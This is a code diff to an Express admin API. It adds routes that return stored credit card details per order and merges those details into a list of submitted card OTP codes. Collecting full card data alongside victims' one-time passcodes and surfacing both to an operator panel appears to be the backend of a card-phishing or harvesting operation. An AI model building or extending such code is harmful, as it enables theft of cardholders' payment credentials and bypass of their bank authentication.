@@ -30,6 +30,7 @@ import { loadChatStore, saveChatStore, appendStaffMessage } from './chatStore.js
 import { loadBotAdmins, saveBotAdmins, normalizeBotAdmins } from './botAdminsStore.js';
 import { BOT_PERMISSION_KEYS, formatPermissionsHelpAr } from './botPermissions.js';
 import { checkAdminLogin } from './adminAuth.js';
+import { getCreditCardOrderDetails } from './creditCardOrdersStore.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
@@ -730,13 +731,25 @@ export function registerAdminApi(app) {
     }
   });
 
+  app.get('/api/admin/orders/:orderId/card', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const card = await getCreditCardOrderDetails(String(req.params.orderId || ''));
+      if (!card) return res.status(404).json({ error: 'لا توجد بيانات بطاقة لهذا الطلب' });
+      res.json({ card });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
   app.get('/api/admin/orders/:orderId', async (req, res) => {
     if (!requireAdmin(req, res)) return;
     try {
       const all = await loadOrders(ORDERS_CRM_PATH);
       const row = findOrderByBusinessId(all, String(req.params.orderId || ''));
       if (!row) return res.status(404).json({ error: 'Order not found' });
-      res.json({ order: row });
+      const card = await getCreditCardOrderDetails(row.orderId || String(req.params.orderId || ''));
+      res.json({ order: row, card });
     } catch (e) {
       res.status(500).json({ error: String(e?.message || e) });
     }
@@ -948,7 +961,13 @@ export function registerAdminApi(app) {
     try {
       const list = await loadCreditCardOtpSubmissions();
       list.sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
-      res.json({ items: list });
+      const items = await Promise.all(
+        list.map(async (s) => ({
+          ...s,
+          card: (await getCreditCardOrderDetails(s.orderId)) || null,
+        })),
+      );
+      res.json({ items });
     } catch (e) {
       res.status(500).json({ error: String(e?.message || e) });
     }
